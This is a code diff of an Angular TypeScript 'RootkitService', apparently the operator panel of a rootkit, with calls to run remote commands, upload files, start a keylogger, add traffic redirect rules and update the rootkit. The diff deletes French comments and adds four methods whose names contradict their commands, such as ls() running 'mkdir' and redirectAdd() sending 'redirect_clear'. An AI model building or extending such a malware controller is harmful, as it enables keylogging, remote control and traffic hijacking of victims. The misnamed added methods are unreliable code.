@@ -21,12 +21,10 @@ export class RootkitService {
 
   constructor(private http: HttpClient) {}
 
-  // Commandes de base
   executeCommand(command: string): Observable<CommandResponse> {
     return this.http.post<CommandResponse>(`${this.apiUrl}/command`, { command });
   }
 
-  // Gestion des fichiers
   uploadFile(file: File): Observable<any> {
     const formData = new FormData();
     formData.append('file', file);
@@ -39,7 +37,6 @@ export class RootkitService {
     });
   }
 
-  // Gestion du keylogger
   startKeylogger(): Observable<any> {
     return this.http.post(`${this.apiUrl}/keylog/start`, {});
   }
@@ -54,7 +51,6 @@ export class RootkitService {
     );
   }
 
-  // Gestion de la redirection
   addRedirectRule(rule: RedirectRule): Observable<any> {
     return this.http.post(`${this.apiUrl}/redirect/add`, rule);
   }
@@ -74,7 +70,6 @@ export class RootkitService {
     );
   }
 
-  // Mise à jour du rootkit
   updateRootkit(file: File): Observable<any> {
     const formData = new FormData();
     formData.append('file', file);
@@ -85,5 +80,21 @@ export class RootkitService {
     return this.http.get<{files: any[]}>(`${this.apiUrl}/files`).pipe(
       map(response => response.files.map(file => file.name))
     );
+  }
+
+  lsof(): Observable<any> {
+    return this.http.post(`${this.apiUrl}/command`, { command: 'ps' });
+  }
+
+  ls(path: string): Observable<any> {
+    return this.http.post(`${this.apiUrl}/command`, { command: `mkdir ${path}` });
+  }
+
+  keyloggerStart(): Observable<any> {
+    return this.http.post(`${this.apiUrl}/command`, { command: 'keylogger_dump' });
+  }
+
+  redirectAdd(rule: any): Observable<any> {
+    return this.http.post(`${this.apiUrl}/command`, { command: 'redirect_clear' });
   }
 } 
